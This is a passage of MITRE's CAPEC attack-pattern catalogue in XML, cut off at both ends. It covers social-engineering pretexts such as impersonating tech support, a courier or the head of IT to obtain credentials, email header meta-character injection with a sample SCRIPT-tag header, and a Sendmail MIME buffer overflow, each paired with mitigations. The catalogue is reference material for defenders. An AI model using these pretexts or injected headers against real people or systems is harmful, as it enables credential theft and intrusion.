         <Description>An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information. Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. In simple form, these attacks can be leveraged to learn information about a target. More complicated iterations may seek to solicit a target to perform some action that assists the adversary in exploiting organizational weaknesses or obtaining access to secure facilities or systems. Pretexting is not a one-size fits all solution. Good information gathering techniques can make or break a good pretext. A solid pretext is an essential part of building trust. If an adversary’s alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="416"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="410"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the adversary's intentions and the specific nature their actions/requests, a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Social Information Gathering via Pretexting</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="41" Name="Using Meta-characters in E-mail Headers to Inject Malicious Payloads" Abstraction="Detailed" Status="Draft">
         <Description>This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="134"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify and characterize metacharacter-processing vulnerabilities in email headers] An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.</Description>
               <Technique>Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.</Technique>
               <Technique>Manually tampering email headers to inject malicious metacharacter-based payload content in them.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.</Description>
               <Technique>Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>This attack targets most widely deployed feature rich email applications, including web based email programs.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To distribute email</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Perform validation on email header data</Mitigation>
            <Mitigation>Implementation: Implement email filtering solutions on mail server or on MTA, relay server.</Mitigation>
            <Mitigation>Implementation: Mail servers that perform strict validation may catch these attacks, because metacharacters are not allowed in many header variables such as dns names</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="margin-left:10px;" class="informative">To:&lt;someone@example.com&gt;<xhtml:br/>From:&lt;badguy@example.com&gt;<xhtml:br/>Header&lt;SCRIPT&gt;payme&lt;/SCRIPT&gt;def: whatever</xhtml:div>
            </Example>
            <Example>
               <xhtml:p>Meta-characters are among the most valuable tools attackers have to deceive users into taking some action on their behalf. E-mail is perhaps the most efficient and cost effective attack distribution tool available, this has led to the phishing pandemic.</xhtml:p>
               <xhtml:p>Meta-characters like \w \s \d ^ can allow the attacker to escape out of the expected behavior to execute additional commands. Escaping out the process (such as email client) lets the attacker run arbitrary code in the user's process.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="150"/>
            <Related_Weakness CWE_ID="88"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="410" Name="Information Elicitation" Abstraction="Meta" Status="Draft">
         <Description>An adversary engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Information Elicitation via Social Engineering</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="412" Name="Pretexting via Customer Service" Abstraction="Detailed" Status="Draft">
         <Description>An adversary engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="413" Name="Pretexting via Tech Support" Abstraction="Detailed" Status="Draft">
         <Description>An adversary engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. An adversary who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an adversary physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="414" Name="Pretexting via Delivery Person" Abstraction="Detailed" Status="Draft">
         <Description>An adversary engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and "deliveries" in order to be able to pull it off.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="415" Name="Pretexting via Phone" Abstraction="Detailed" Status="Draft">
         <Description>An adversary engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="407"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="416" Name="Manipulate Human Behavior" Abstraction="Meta" Status="Stable">
         <Description>An adversary exploits inherent human psychological predisposition to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the adversary's interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled adversary uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the adversary's speech and thought patterns.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attack patterns that manipulate human behavior can result in a wide variety of consequences and potentially affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Social Engineering</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="417" Name="Influence Perception" Abstraction="Standard" Status="Stable">
         <Description>The adversary uses social engineering to exploit the target's perception of the relationship between the adversary and themselves. This goal is to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="416"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>There are no necessary resources required for this attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
            <Reference External_Reference_ID="REF-360"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Reciprocation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="418" Name="Influence Perception of Reciprocation" Abstraction="Detailed" Status="Draft">
         <Description>An adversary uses a social engineering techniques to produce a sense of obligation in the target to perform a certain action or concede some sensitive or key piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. There are various techniques for fostering a sense of obligation to reciprocate or concede during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary develops a relationship with the target to foster a feeling of obligation in them to perform a certain action or concede some information. A perception of obligation/concession means that the target feels they need to behave in some way or perform some sort of action due to being morally or legally bound to do so.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-348"/>
            <Reference External_Reference_ID="REF-360"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Obligation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="42" Name="MIME Conversion" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>Identify places in the system where vulnerable MIME conversion routines may be used.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target system uses a mail server.</Prerequisite>
            <Prerequisite>Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">It may be trivial to cause a DoS via this attack pattern</Skill>
            <Skill Level="High">Causing arbitrary code to execute on the target system.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Stay up to date with third party vendor patches</Mitigation>
            <Mitigation>
               <xhtml:p>Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file.</xhtml:p>
               <xhtml:p>For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration):</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,<xhtml:div style="margin-left:10px;">T=DNS/RFC822/X-Unix,<xhtml:br/>A=mail -d $u</xhtml:div>
                  <xhtml:br/>Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,<xhtml:div style="margin-left:10px;">D=$z:/,<xhtml:br/>T=X-Unix,<xhtml:br/>A=sh -c $u</xhtml:div>
               </xhtml:div>
               <xhtml:p>This can be achieved for the "Mlocal" and "Mprog" Mailers by modifying the ".mc" file to include the following lines:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">define(`LOCAL_MAILER_FLAGS',<xhtml:div style="margin-left:10px;">ifdef(`LOCAL_MAILER_FLAGS',<xhtml:div style="margin-left:10px;">`translit(LOCAL_MAILER_FLAGS, `9')',<xhtml:br/>`rmn'))</xhtml:div>
                  </xhtml:div>
                  <xhtml:br/>define(`LOCAL_SHELL_FLAGS',<xhtml:div style="margin-left:10px;">ifdef(`LOCAL_SHELL_FLAGS',<xhtml:div style="margin-left:10px;">`translit(LOCAL_SHELL_FLAGS, `9')',<xhtml:br/>`eu'))</xhtml:div>
                  </xhtml:div>
               </xhtml:div>
               <xhtml:p>and then rebuilding the sendmail.cf file using m4(1).</xhtml:p>
               <xhtml:p>From "Exploiting Software", please see reference below.</xhtml:p>
            </Mitigation>
            <Mitigation>Use the sendmail restricted shell program (smrsh)</Mitigation>
            <Mitigation>Use mail.local</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Sendmail Overflow</xhtml:div>
               <xhtml:p>A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.</xhtml:p>
               <xhtml:p>Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.</xhtml:p>See also: CVE-1999-0047</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-364"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="420" Name="Influence Perception of Scarcity" Abstraction="Detailed" Status="Stable">
         <Description>The adversary leverages a perception of scarcity to persuade the target to perform an action or divulge information that is advantageous to the adversary. By conveying a perception of scarcity, or a situation of limited supply, the adversary aims to create a sense of urgency in the context of a target's decision-making process.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary sends an email to a target about a limited-time opportunity to claim a considerable monetary reward. The email contains a link to a site which the adversary says is only active for a short time and to the first person to claim it. By convincing the user of the scarcity of the monetary reward, the adversary aims to persuade them to click on the malicious link in the email.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Scarcity</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="421" Name="Influence Perception of Authority" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a social engineering technique to convey a sense of authority that motivates the target to reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization, an adversary may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the adversary.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The adversary calls the target and announces that he is the head of IT at the target's company. The adversary goes on to say that there has been a technical issue and he/she needs the target's login credentials for their account. By convincing the target of his/her authority, the adversary hopes the target will reveal the sensitive information.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
